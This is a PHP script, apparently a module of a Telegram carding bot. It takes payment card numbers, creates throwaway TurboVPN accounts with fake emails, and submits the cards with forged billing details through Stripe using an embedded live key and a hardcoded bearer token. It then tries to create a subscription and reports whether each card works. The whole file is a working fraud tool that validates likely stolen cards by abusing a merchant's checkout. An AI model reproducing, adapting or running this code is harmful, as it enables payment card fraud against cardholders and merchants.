<?php
ini_set('display_errors', 1);
use App\Models\Bot;
use App\Gate\{CurlX, Make, Responses as Res};
use App\Faker\{Name, Address, PhoneNumber, Internet};

$ccs = $ccs[0];
$cc  = $ccs['cc'];
$user['ida'] = Bot::SendMsg($user['chat_id'], "<b>Gate <u>".$gate['name']."</u> <i>started</i>♻️\nCard: <code>".implode('|', $cc)."</code>\nTime:</b> <i>".Make::Took()."'s</i>", $user['msg_id'])['result']['message_id'];

# ~ REQ 1 ~ #
$header1 = ['Host: www.turbovpn.com', 'x-app-type: 502', 'Content-Type: application/json'];
$post1 = '{"email":"'.Internet::freeEmail().'"}';
$site1 = ['url' => 'https://www.turbovpn.com/api/mms/account/v1/web/anonymous_signup','method' => 'POST', 'post' => $post1, 'headers' => $header1, 'cookie' => null, 'proxy' => null];
$req1 = Make::Create(1, $site1, $gate, $user);
IsUnspam($req1, $user);
$fim1 = json_decode($req1->body, true);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(1, implode('|', $cc), $gate['name'], $lang['wait']));

# -- REQ 2 -- #
$headers2 = ['accept: application/json','content-type: application/x-www-form-urlencoded','origin: https://api.stripe.com','referer: https://api.stripe.com/','user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.81 Safari/537.36'];
$post2 = 'type=card&billing_details[email]='.Internet::freeEmail().'&billing_details[name]='.Name::firstName().'+'.Name::lastName().'&billing_details[address][country]=US&billing_details[address][postal_code]=10001&card[number]='.$cc[0].'&card[cvc]='.$cc[3].'&card[exp_month]='.$cc[1].'&card[exp_year]='.$cc[2].'&guid=2a7ee247-b1b3-4d66-8762-ee02f18a165b43a73a&muid=6f27d26f-df70-41c5-bf4b-b002a119979504d2f3&sid=ed6e6aba-8776-4cbc-a41e-58fcc9d5b858d646bc&pasted_fields=number&payment_user_agent=stripe.js%2Fdb679ddd7%3B+stripe-js-v3%2Fdb679ddd7&time_on_page=51980&key=pk_live_51IVYnWA3REHazOT1w1cx6bcdLI4A7ovha5TsKWd47ZFcOjcssEWUbWIxyGpAKBE1MgVWcejuEWosZurqOM5cpWfK00KAOzX8dH';
$req2 = Make::Create(2, ['url' => 'https://api.stripe.com/v1/payment_methods', 'method' => 'POST', 'post' => $post2, 'headers' => $headers2, 'cookie' => null, 'proxy' => null], $gate, $user);
IsUnspam($req2, $user);
$sid = CurlX::ParseString($req2->body, '"id": "','"');
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(2, implode('|', $cc), $gate['name'], $lang['wait']));

# -- REQ 3 -- #
$headers3 = ['Host: www.turbovpn.com', 'authorization: Bearer 196d64e4-8c7d-4994-bc81-9eb5e7b3e661', 'x-app-type: 502', 'Content-Type: application/json'];
$post3 = '{"_channel":"winfreetry","_source":"","_device_platform":"android","_country":"VE","user_id":'.$fim1['user_id'].',"email":"'.Internet::freeEmail().'","apptype":502,"product_id":"vpn.turbo.pc.twoyearsplan.pm65","ext":{"front_id":"15da85a6-34cc-4c6a-80b3-1d83b3d5b31"},"sequence":0,"payment_id":"'.$sid.'"}';
$req3 = Make::Create(3, ['url' => 'https://www.turbovpn.com/api/mms/payment/v1/providers/s1/create_subscription', 'method' => 'POST', 'post' => $post3, 'headers' => $headers3, 'cookie' => null, 'proxy' => null], $gate, $user);
IsUnspam($req3, $user);
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Wait(3, implode('|', $cc), $gate['name'], $lang['wait']));
    
Res::SetParams($req3->body, null, null, null, $req2->body);
$res = Res::Stripe();
Bot::EditMsgTxt($user['chat_id'], $user['ida'], Make::Parse($lang['final'], $user, implode('|', $cc), $res, $ccs['bin'], $gate['name']));